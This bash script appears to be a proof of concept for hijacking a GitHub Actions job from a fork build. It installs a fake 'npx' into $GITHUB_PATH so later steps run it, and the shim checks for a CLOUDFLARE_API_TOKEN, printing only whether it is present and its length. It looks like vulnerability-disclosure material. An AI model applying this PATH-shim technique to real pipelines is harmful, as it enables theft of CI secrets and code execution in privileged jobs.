#!/usr/bin/env bash
set -euo pipefail
echo "FORK_BUILD_EXECUTED_IN_PRIVILEGED_JOB=true"
mkdir -p "$HOME/.poc-shim"
cat > "$HOME/.poc-shim/npx" <<'SHIM'
#!/usr/bin/env bash
if [ -n "${CLOUDFLARE_API_TOKEN:-}" ]; then
  echo "CANARY_PRESENT=yes len=${#CLOUDFLARE_API_TOKEN}"
else
  echo "CANARY_PRESENT=no"
fi
SHIM
chmod +x "$HOME/.poc-shim/npx"
echo "$HOME/.poc-shim" >> "$GITHUB_PATH"
echo "PATH_SHIM_INSTALLED=true"
